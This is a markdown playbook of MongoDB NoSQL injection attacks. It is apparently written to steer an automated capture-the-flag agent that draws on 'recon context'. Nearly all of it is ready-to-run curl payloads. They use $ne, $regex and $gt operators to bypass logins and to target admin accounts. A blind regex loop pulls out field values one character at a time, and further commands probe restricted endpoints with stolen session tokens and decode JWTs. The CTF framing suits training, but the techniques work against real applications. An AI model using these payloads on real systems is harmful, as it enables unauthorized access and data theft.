# NoSQL Injection Patterns (MongoDB)

## Detection — Confirm NoSQL Injection Type

Before sending any payload, extract from recon context:
- **ENDPOINT**: which URL was flagged as injectable
- **PARAMS**: which parameters were observed (from form HTML, request body, or recon output)
- **Content-Type**: form-encoded or JSON

```bash
# Array injection — MongoDB interprets PARAM[] as array, matches anything
# Use field names from the endpoint's actual request structure
curl -s -X POST "CONFIRMED_ENDPOINT" \
  -d "PARAM1[]=.*&PARAM2[]=.*" | grep -iE "redirect|success|found|200"

# Operator injection — send operators in JSON body
curl -s -X POST "CONFIRMED_ENDPOINT" \
  -H "Content-Type: application/json" \
  -d '{"FIELD1": {"$ne": ""}, "FIELD2": {"$ne": ""}}' | python3 -m json.tool

# $regex operator — match any value
curl -s -X POST "CONFIRMED_ENDPOINT" \
  -H "Content-Type: application/json" \
  -d '{"FIELD1": {"$regex": ".*"}, "FIELD2": {"$regex": ".*"}}' | grep -iE "success|token"

# $gt operator on numeric/ID fields
curl -s "ENDPOINT?PARAM[$gt]=0"
curl -s "ENDPOINT?PARAM[$ne]=null"
```

**Where to find field names:**
- Read the login/search form HTML — `name=` attributes on inputs
- Look at a normal failed request from recon — the POST body fields
- Check the recon context ENDPOINTS: block for documented params

---

## Auth Bypass on Login

Identify the login endpoint and its field names from recon context first.

```bash
# JSON operator injection — bypass credential check
curl -s -X POST "LOGIN_ENDPOINT" \
  -H "Content-Type: application/json" \
  -d '{"USER_FIELD": {"$regex": ".*"}, "PASS_FIELD": {"$ne": "x"}}' | python3 -m json.tool

# Array injection — URL-encoded form
curl -s -X POST "LOGIN_ENDPOINT" \
  -d "USER_FIELD[$regex]=.*&PASS_FIELD[$ne]=x"

# Target a privileged user (admin, root, superuser — try each)
curl -s -X POST "LOGIN_ENDPOINT" \
  -H "Content-Type: application/json" \
  -d '{"USER_FIELD": {"$regex": "^admin"}, "PASS_FIELD": {"$ne": "x"}}'
```

**Parse the full response body** — flag or session token may be in any field:
```bash
curl -s -X POST "LOGIN_ENDPOINT" \
  -H "Content-Type: application/json" \
  -d '{"USER_FIELD": {"$regex": ".*"}, "PASS_FIELD": {"$ne": "x"}}' | python3 -c "
import sys, json, re
body = sys.stdin.read()
try:
    d = json.loads(body)
    print(json.dumps(d, indent=2))
except:
    pass
# Scan for flag pattern regardless of structure
flags = re.findall(r'[A-Za-z0-9_]+\{[^}]+\}', body)
if flags: print('FLAG PATTERN:', flags)
"
```

---

## Data Extraction via Boolean Regex (blind)

Use when the injectable endpoint returns a binary signal (redirect vs error, 200 vs 401).
Use the actual injectable field names from recon context.

```bash
# Step 1: find what the injectable field's value starts with
for char in a b c d e f g h i j k l m n o p q r s t u v w x y z 0 1 2 3 4 5 6 7 8 9 _; do
  result=$(curl -s -X POST "INJECTABLE_ENDPOINT" \
    -d "INJECTABLE_PARAM[\$regex]=^$char&OTHER_PARAM[\$regex]=.*" \
    | grep -c "Redirect\|Found\|success\|200")
  [ "$result" -gt "0" ] && echo "STARTS WITH: $char"
done

# Step 2: extend known prefix one character at a time
# Replace KNOWN_PREFIX with what you found in Step 1
for char in a b c d e f g h i j k l m n o p q r s t u v w x y z 0 1 2 3 4 5 6 7 8 9 _ @ .; do
  result=$(curl -s -X POST "INJECTABLE_ENDPOINT" \
    -d "INJECTABLE_PARAM[\$regex]=^KNOWN_PREFIX$char&OTHER_PARAM[\$regex]=.*" \
    | grep -c "Redirect\|Found\|success")
  [ "$result" -gt "0" ] && echo "MATCH: KNOWN_PREFIX$char"
done
```

---

## Flag Extraction Strategy

**Common flag storage patterns in CTF:**
1. Flag in any extra field on the user/record object returned from login or lookup
2. Flag only visible when authenticated as a privileged user
3. Flag behind a restricted endpoint — check recon ENDPOINTS: for anything marked admin/internal/flag
4. Flag in a specific record — enumerate all records via `$regex=.*`, parse each one fully

**After login bypass — parse the full response:**
```bash
# Full JSON parse — flag may be in any key, not just the obvious ones
curl -s -X POST "LOGIN_ENDPOINT" \
  -H "Content-Type: application/json" \
  -d '{"USER_FIELD": {"$regex": ".*"}, "PASS_FIELD": {"$ne": "x"}}' | python3 -c "
import sys, json, re
body = sys.stdin.read()
try:
    d = json.loads(body)
    print(json.dumps(d, indent=2))
    # Recursively scan all string values for flag pattern
    def scan(obj):
        if isinstance(obj, str):
            m = re.findall(r'[A-Za-z0-9_]+\{[^}]+\}', obj)
            if m: print('FLAG CANDIDATE:', m)
        elif isinstance(obj, dict):
            for v in obj.values(): scan(v)
        elif isinstance(obj, list):
            for v in obj: scan(v)
    scan(d)
except:
    flags = re.findall(r'[A-Za-z0-9_]+\{[^}]+\}', body)
    print('Flags found:', flags)
"

# After getting session — probe restricted endpoints from recon context
# Use ENDPOINTS: from web-recon output — do NOT guess paths
SESSION="TOKEN_FROM_LOGIN_RESPONSE"
for path in ENDPOINT_1_FROM_RECON ENDPOINT_2_FROM_RECON; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "TARGET$path" \
    -H "Cookie: SESSION_COOKIE_NAME=$SESSION" \
    -H "Authorization: Bearer $SESSION")
  body=$(curl -s "TARGET$path" \
    -H "Cookie: SESSION_COOKIE_NAME=$SESSION" \
    -H "Authorization: Bearer $SESSION" | head -c 500)
  echo "$code $path: $body"
done
```

---

## Escalation After Auth Bypass

Once you have a session token/cookie:

1. **Check what web-recon found** — ENDPOINTS: block lists every path the recon agent discovered. Probe those, not a guessed list.
2. **Decode JWT if returned** — claims may contain role, flag, or user ID to escalate:
```bash
echo "JWT_TOKEN" | cut -d'.' -f2 | python3 -c "
import sys, base64, json
p = sys.stdin.read().strip()
p += '=' * (-len(p) % 4)
print(json.dumps(json.loads(base64.urlsafe_b64decode(p)), indent=2))
"
```
3. **Read enumerated records fully** — when the endpoint returns lists (users, orders, items), fetch each record individually and parse every field.
